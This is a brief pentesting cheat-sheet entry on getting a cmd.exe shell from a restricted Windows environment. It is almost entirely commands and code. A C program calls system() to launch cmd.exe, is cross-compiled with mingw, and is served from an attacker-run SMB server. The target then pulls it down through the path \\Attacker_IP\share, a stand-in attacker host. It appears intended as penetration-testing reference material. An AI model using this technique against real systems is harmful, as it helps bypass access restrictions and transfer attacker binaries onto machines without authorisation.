# Indirect Shell: cmd.exe

Shell access can be gained in a restricted environment by hosting a binary in the local share and accessing it from the target.

1. Create `pwn.c` with following content

        #include <stdlib.h>
            int main() {
            system("C:\\Windows\\System32\\cmd.exe");
        }

2. Compile the C program to generate `pwn.exe`

        apt install mingw-w64
        x86_64-w64-mingw32-gcc pwn.c -o pwn.exe

3. Start an SMB server to serve the binary

        /usr/share/setoolkit/venv/bin/smbserver.py -smb2support share ./pwn/

4. Download the binary onto the target Windows server by accessing following path

        \\Attacker_IP\share
